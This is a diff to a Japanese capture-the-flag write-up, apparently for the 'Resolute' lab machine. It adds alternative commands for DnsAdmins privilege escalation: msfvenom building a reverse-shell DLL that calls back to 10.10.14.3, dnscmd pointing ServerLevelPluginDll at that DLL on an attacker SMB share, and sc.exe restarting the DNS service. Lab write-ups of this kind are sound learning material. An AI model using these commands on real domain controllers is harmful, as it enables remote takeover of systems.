@@ -60,6 +60,10 @@ SERVICE_NAME: dns
 
 ```
 msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f dll --platform windows -o rev.dll
+
+or
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=443 -f dll rev.dll
 ```
 
 #### rev.dllがあるディレクトリでsmbサーバを立てる：
@@ -87,9 +91,13 @@ $ nc -nvlp 4444
 
 [ryanのリバースシェル上]
 
+（Resolute.megabank.localはDomainControllerの名前）
+
 ```
 *Evil-WinRM* PS C:\Users\ryan> dnscmd.exe resolute.megabank.local /config /serverlevelplugindll \\10.10.14.3\kali\rev.dll
+
 or
+
 *Evil-WinRM* PS C:\Users\ryan> dnscmd.exe 127.0.0.1 /config /serverlevelplugindll \\10.10.14.3\kali\rev.dll
 ```
 レジストリの値`ServerLevelPluginDll`がきちんと我々のマリシャスdllを指し示してることを確認：
@@ -114,4 +122,11 @@ PSProvider           : Microsoft.PowerShell.Core\Registry
 *Evil-WinRM* PS C:\Users\ryan> sc.exe stop dns
 
 *Evil-WinRM* PS C:\Users\ryan> sc.exe start dns
+```
+もしくは
+
+```
+*Evil-WinRM* PS C:\Users\ryan> sc.exe \\Resolute.megabank.local stop dns
+
+*Evil-WinRM* PS C:\Users\ryan> sc.exe \\Resolute.megabank.local start dns
 ```
